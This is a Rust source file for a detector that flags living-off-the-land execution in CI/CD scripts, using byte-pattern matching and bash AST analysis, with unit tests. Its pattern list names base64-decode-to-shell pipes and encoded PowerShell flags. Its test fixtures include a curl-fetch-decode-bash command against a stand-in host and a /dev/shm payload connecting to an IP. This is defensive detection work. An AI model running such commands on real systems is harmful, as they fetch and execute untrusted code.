//! # LotL Hunter — Living-off-the-Land Execution Anomaly Detector
//!
//! Detects "Living off the Land" attack patterns in CI/CD pipeline scripts and
//! shell code embedded in patch payloads.  Two complementary detection layers:
//!
//! ## Layer 1 — AhoCorasick Fast Path (O(N), zero heap alloc in scan loop)
//!
//! Single-pass scan for definitive high-confidence LotL indicators:
//! - PowerShell encoded command flags (`-EncodedCommand`, `-enc`)
//! - Base64 decode pipes to shell (`base64 -d | sh`, `base64 --decode | bash`)
//! - Chained pipe-decode-exec variants
//!
//! ## Layer 2 — Structural Bash AST Analysis (tree-sitter-bash)
//!
//! For `.sh`, `.yml`, `.yaml`, `Makefile`, and generic shell payloads: the
//! patch is parsed with `tree-sitter-bash` and the AST is walked to detect:
//! - Direct execution of binaries located in `/tmp/` or `/dev/shm/`
//!   (world-writable, memory-backed — classic LotL staging areas)
//! - Pipeline nodes containing `base64` piped to `sh`/`bash` (structural form
//!   catches whitespace-obfuscated variants that evade the byte scanner)
//!
//! The structural layer runs only when the fast path produces no match.  Both
//! layers emit a [`LotlThreatReport`] labeled
//! `"security:lotl_execution_anomaly"`.
//!
//! ## PowerShell
//!
//! `tree-sitter-powershell` is not in the workspace.  PowerShell LotL is
//! handled entirely by the AhoCorasick layer, which is sufficient for the
//! highly distinctive `-EncodedCommand` / `-enc` flag vocabulary.

use std::sync::OnceLock;

use aho_corasick::{AhoCorasick, MatchKind};
use tree_sitter::{Node, Parser};

// ---------------------------------------------------------------------------
// Public surface
// ---------------------------------------------------------------------------

/// A confirmed Living-off-the-Land execution anomaly.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct LotlThreatReport {
    /// Machine-readable label: always `"security:lotl_execution_anomaly"`.
    pub label: &'static str,
    /// Byte offset of the triggering sequence in the input slice.
    pub byte_offset: usize,
    /// Human-readable description of the specific technique detected.
    pub technique: &'static str,
}

/// Machine-readable label emitted for every LotL threat.
pub const LOTL_LABEL: &str = "security:lotl_execution_anomaly";

// ---------------------------------------------------------------------------
// Layer 1: AhoCorasick — definitive single-indicator patterns
// ---------------------------------------------------------------------------

static LOTL_PATTERNS: &[(&[u8], &str)] = &[
    // PowerShell encoded command execution
    (
        b"-EncodedCommand",
        "PowerShell -EncodedCommand: base64 payload execution",
    ),
    (
        b"-encodedcommand",
        "PowerShell -encodedcommand: base64 payload execution",
    ),
    (b" -enc ", "PowerShell -enc flag: encoded command execution"),
    // Base64 decode piped to shell — definitive LotL execution chain
    (b"base64 -d | sh", "base64 decode piped to sh"),
    (b"base64 -d | bash", "base64 decode piped to bash"),
    (b"base64 --decode | sh", "base64 --decode piped to sh"),
    (b"base64 --decode | bash", "base64 --decode piped to bash"),
    // Chained variants: ... | base64 -d | sh/bash
    (b"| base64 -d | sh", "chained base64 decode-exec to sh"),
    (b"| base64 -d | bash", "chained base64 decode-exec to bash"),
    (
        b"| base64 --decode | sh",
        "chained base64 decode-exec to sh",
    ),
    (
        b"| base64 --decode | bash",
        "chained base64 decode-exec to bash",
    ),
];

static LOTL_AC: OnceLock<AhoCorasick> = OnceLock::new();

fn lotl_automaton() -> &'static AhoCorasick {
    LOTL_AC.get_or_init(|| {
        AhoCorasick::builder()
            .match_kind(MatchKind::LeftmostFirst)
            .build(LOTL_PATTERNS.iter().map(|(pat, _)| pat))
            .expect("LotL automaton construction must succeed")
    })
}

// ---------------------------------------------------------------------------
// Layer 2: tree-sitter-bash — structural AST analysis
// ---------------------------------------------------------------------------

/// File extensions / names that indicate a shell-parseable script context.
fn is_bash_context(filename: &str) -> bool {
    filename.ends_with(".sh")
        || filename.ends_with(".bash")
        || filename.ends_with(".yml")
        || filename.ends_with(".yaml")
        || filename.ends_with("Makefile")
        || filename.ends_with("makefile")
        || filename.ends_with(".mk")
}

fn bash_parser() -> Parser {
    let mut p = Parser::new();
    p.set_language(&tree_sitter_bash::LANGUAGE.into())
        .expect("bash grammar must load");
    p
}

/// Walk the bash AST looking for LotL execution topologies.
///
/// Checks two structural patterns:
/// 1. `command` nodes whose first word resolves to a `/tmp/` or `/dev/shm/`
///    path — staging-area binary execution.
/// 2. `pipeline` nodes containing a `base64` command piped to `sh` or `bash`
///    — structural form catches whitespace-obfuscated decode-exec chains.
fn walk_ast<'a>(node: Node<'a>, source: &[u8]) -> Option<LotlThreatReport> {
    match node.kind() {
        "command" => {
            if let Some(report) = check_staging_exec(node, source) {
                return Some(report);
            }
        }
        "pipeline" => {
            if let Some(report) = check_decode_exec_pipeline(node, source) {
                return Some(report);
            }
        }
        _ => {}
    }

    // Recurse into children.
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if let Some(report) = walk_ast(child, source) {
            return Some(report);
        }
    }
    None
}

/// Detect direct execution of a binary staged in `/tmp/` or `/dev/shm/`.
fn check_staging_exec<'a>(cmd_node: Node<'a>, source: &[u8]) -> Option<LotlThreatReport> {
    // The command name is the first `word` child (or the `name` field if
    // the grammar exposes it).
    let name_node = cmd_node
        .child_by_field_name("name")
        .or_else(|| cmd_node.child(0))?;

    let text = name_node.utf8_text(source).ok()?;

    if text.starts_with("/tmp/") || text.starts_with("/dev/shm/") {
        return Some(LotlThreatReport {
            label: LOTL_LABEL,
            byte_offset: name_node.start_byte(),
            technique: "direct execution of binary from world-writable staging directory (/tmp/ or /dev/shm/)",
        });
    }
    None
}

/// Detect a pipeline of the form `... | base64 [-d|--decode] | sh|bash`.
///
/// This structural check catches whitespace-padded or alias-indirected variants
/// that the byte-level scanner would miss.
fn check_decode_exec_pipeline<'a>(
    pipeline_node: Node<'a>,
    source: &[u8],
) -> Option<LotlThreatReport> {
    let mut saw_base64 = false;
    let mut cursor = pipeline_node.walk();

    for child in pipeline_node.children(&mut cursor) {
        if child.kind() != "command" {
            continue;
        }

        // Get command name: field "name" or first child.
        let name_node = match child.child_by_field_name("name").or_else(|| child.child(0)) {
            Some(n) => n,
            None => continue,
        };

        let text = match name_node.utf8_text(source) {
            Ok(t) => t,
            Err(_) => continue,
        };

        if text == "base64" {
            saw_base64 = true;
        } else if saw_base64 && (text == "sh" || text == "bash") {
            return Some(LotlThreatReport {
                label: LOTL_LABEL,
                byte_offset: name_node.start_byte(),
                technique: "base64 decode piped to shell (structural AST match)",
            });
        }
    }
    None
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/// Scan `data` for Living-off-the-Land execution anomalies.
///
/// Applies the AhoCorasick fast path first.  If no definitive indicator is
/// found and `filename` indicates a bash-parseable context, the structural
/// AST layer runs as a second pass.
///
/// Returns the first [`LotlThreatReport`] found, or `None` if clean.
pub fn scan(data: &[u8], filename: &str) -> Option<LotlThreatReport> {
    // --- Layer 1: AhoCorasick ---
    let ac = lotl_automaton();
    if let Some(m) = ac.find_iter(data).next() {
        let idx = m.pattern().as_usize();
        return Some(LotlThreatReport {
            label: LOTL_LABEL,
            byte_offset: m.start(),
            technique: LOTL_PATTERNS[idx].1,
        });
    }

    // --- Layer 2: tree-sitter-bash structural analysis ---
    if is_bash_context(filename) {
        let mut parser = bash_parser();
        if let Some(tree) = parser.parse(data, None) {
            return walk_ast(tree.root_node(), data);
        }
    }

    None
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_powershell_encoded_command() {
        let src =
            b"powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==";
        let report = scan(src, "setup.ps1").expect("must detect -EncodedCommand");
        assert_eq!(report.label, LOTL_LABEL);
        assert!(report.technique.contains("EncodedCommand"));
    }

    #[test]
    fn detects_base64_decode_pipe_to_bash() {
        let src = b"echo SGVsbG8gV29ybGQ= | base64 -d | bash";
        let report = scan(src, "ci.yml").expect("must detect base64 decode pipe");
        assert_eq!(report.label, LOTL_LABEL);
        assert!(report.technique.contains("base64"));
    }

    #[test]
    fn detects_tmp_exec_via_ast() {
        // No AhoCorasick match — only the AST layer catches this.
        let src = b"#!/bin/sh\n/tmp/update_agent --silent\n";
        let report = scan(src, "postinstall.sh").expect("must detect /tmp/ exec via AST");
        assert_eq!(report.label, LOTL_LABEL);
        assert!(report.technique.contains("/tmp/"));
    }

    #[test]
    fn detects_dev_shm_exec_via_ast() {
        let src = b"#!/bin/sh\n/dev/shm/payload --connect 10.0.0.1\n";
        let report = scan(src, "hook.sh").expect("must detect /dev/shm/ exec via AST");
        assert!(report.technique.contains("/dev/shm/"));
    }

    #[test]
    fn detects_pipeline_base64_to_bash_via_ast() {
        // Structural pipeline: `curl ... | base64 -d | bash`
        // The "base64 -d | bash" portion has a space before "|" which may or
        // may not be caught by the byte scanner depending on spacing.
        // The AST layer provides the structural backstop.
        let src = b"#!/bin/bash\ncurl -s http://example.internal/payload | base64 -d | bash\n";
        let report = scan(src, "deploy.sh").expect("must detect via layer-1 or layer-2");
        assert_eq!(report.label, LOTL_LABEL);
    }

    #[test]
    fn clean_makefile_is_not_flagged() {
        let src = b"build:\n\tcargo build --release\n\ntest:\n\tcargo test --all\n";
        assert!(
            scan(src, "Makefile").is_none(),
            "clean Makefile must not trigger"
        );
    }

    #[test]
    fn clean_yaml_ci_is_not_flagged() {
        let src =
            b"- name: Run tests\n  run: cargo test --all --workspace\n  env:\n    RUST_LOG: info\n";
        assert!(
            scan(src, "ci.yml").is_none(),
            "clean CI YAML must not trigger"
        );
    }

    #[test]
    fn detects_chained_pipe_decode_exec() {
        let src = b"cat payload.b64 | base64 --decode | bash";
        let report = scan(src, "run.sh").expect("must detect chained decode-exec");
        assert_eq!(report.label, LOTL_LABEL);
    }
}
